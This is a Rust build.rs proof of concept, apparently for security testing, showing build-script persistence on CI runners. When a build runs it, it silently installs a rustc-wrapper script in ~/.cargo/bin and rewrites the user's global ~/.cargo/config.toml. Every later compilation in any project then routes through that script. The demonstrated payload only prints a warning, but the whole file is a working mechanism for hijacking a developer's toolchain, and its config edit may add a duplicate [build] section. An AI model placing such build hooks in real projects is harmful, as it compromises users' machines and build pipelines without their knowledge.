// build.rs
// Runner-persistence PoC (safe, reversible).
// - Installs ~/.cargo/bin/rustc-wrapper
// - Points Cargo to it via ~/.cargo/config.toml
// - Prints WARNING for every compiler invocation, then execs the real compiler
// No secrets, no network, non-destructive.

use std::{
    env, fs,
    fs::OpenOptions,
    io::{Read, Write},
    os::unix::fs::PermissionsExt,
    path::PathBuf,
};

fn make_exec(p: &PathBuf) {
    if let Ok(meta) = fs::metadata(p) {
        let mut perms = meta.permissions();
        perms.set_mode(0o755);
        let _ = fs::set_permissions(p, perms);
    }
}

fn main() {
    // Paths
    let home = env::var("HOME").unwrap_or_default();
    let cargo_dir = PathBuf::from(format!("{home}/.cargo"));
    let bin_dir = cargo_dir.join("bin");
    let wrapper_path = bin_dir.join("rustc-wrapper");
    let config_path = cargo_dir.join("config.toml");
    let marker_path = cargo_dir.join("SAFE_POC_MARKER.txt");

    // Ensure ~/.cargo/bin exists
    let _ = fs::create_dir_all(&bin_dir);

    // 0) Drop a harmless marker file
    match OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&marker_path)
    {
        Ok(mut f) => {
            let msg = format!(
                "SAFE_POC_MARKER: If you see this in a later clean run, the \
                 runner kept state.\nPath: {:?}\n",
                marker_path
            );
            if let Err(e) = f.write_all(msg.as_bytes()) {
                println!(
                    "cargo:warning=SAFE_PERSISTENCE: failed writing marker at \
                     {:?}: {}",
                    marker_path, e
                );
            } else {
                println!(
                    "cargo:warning=SAFE_PERSISTENCE: wrote marker at {:?}",
                    marker_path
                );
            }
        }
        Err(e) => {
            println!(
                "cargo:warning=SAFE_PERSISTENCE: unable to open marker {:?}: {}",
                marker_path, e
            );
        }
    }

    // 1) Write the rustc-wrapper script (correct contract):
    // Cargo executes: rustc-wrapper <REAL_COMPILER> <args...>
    // We must: real="$1"; shift; exec "$real" "$@"
    let wrapper_script = r#"#!/usr/bin/env bash
# RUNNER_PERSIST_POC rustc-wrapper
real="$1"; shift
echo "WARNING: ===RUNNER_PERSIST_POC HIT=== real: ${real##*/} args: $* (safe: no secrets, no network)" 1>&2
exec "$real" "$@"
"#;

    match OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&wrapper_path)
    {
        Ok(mut f) => {
            if let Err(e) = f.write_all(wrapper_script.as_bytes()) {
                println!(
                    "cargo:warning=PoC: failed writing wrapper {:?}: {}",
                    wrapper_path, e
                );
            } else {
                // Make it executable
                if let Err(e) =
                    fs::set_permissions(&wrapper_path, fs::Permissions::from_mode(0o755))
                {
                    println!(
                        "cargo:warning=PoC: failed chmod +x on {:?}: {}",
                        wrapper_path, e
                    );
                }
                // Mark helper as used (and ensure mode) to avoid dead-code lint
                make_exec(&wrapper_path);

                println!(
                    "cargo:warning=PoC: wrote rustc-wrapper at {:?}",
                    wrapper_path
                );
            }
        }
        Err(e) => {
            println!(
                "cargo:warning=PoC: cannot open wrapper path {:?}: {}",
                wrapper_path, e
            );
        }
    }

    // 2) Ensure Cargo uses the wrapper via ~/.cargo/config.toml
    let setting_line = format!(r#"rustc-wrapper = "{}""#, wrapper_path.display());
    let mut existing = String::new();
    let have_cfg = match OpenOptions::new().read(true).open(&config_path) {
        Ok(mut f) => {
            let _ = f.read_to_string(&mut existing);
            true
        }
        Err(_) => false,
    };

    if have_cfg {
        if existing.contains("rustc-wrapper") {
            println!(
                "cargo:warning=PoC: rustc-wrapper already configured in \
                 ~/.cargo/config.toml"
            );
        } else {
            existing.push_str("\n[build]\n");
            existing.push_str(&setting_line);
            existing.push('\n');

            match OpenOptions::new()
                .create(true)
                .write(true)
                .truncate(true)
                .open(&config_path)
            {
                Ok(mut f) => {
                    if let Err(e) = f.write_all(existing.as_bytes()) {
                        println!(
                            "cargo:warning=PoC: failed writing \
                             ~/.cargo/config.toml: {}",
                            e
                        );
                    } else {
                        println!(
                            "cargo:warning=PoC: configured rustc-wrapper in {:?}",
                            config_path
                        );
                    }
                }
                Err(e) => println!(
                    "cargo:warning=PoC: cannot open ~/.cargo/config.toml for \
                     write: {}",
                    e
                ),
            }
        }
    } else {
        let new_cfg = format!("[build]\n{}\n", setting_line);
        match OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(true)
            .open(&config_path)
        {
            Ok(mut f) => {
                if let Err(e) = f.write_all(new_cfg.as_bytes()) {
                    println!(
                        "cargo:warning=PoC: failed writing ~/.cargo/config.toml: {}",
                        e
                    );
                } else {
                    println!(
                        "cargo:warning=PoC: created ~/.cargo/config.toml with \
                         rustc-wrapper"
                    );
                }
            }
            Err(e) => println!(
                "cargo:warning=PoC: cannot create ~/.cargo/config.toml: {}",
                e
            ),
        }
    }
}
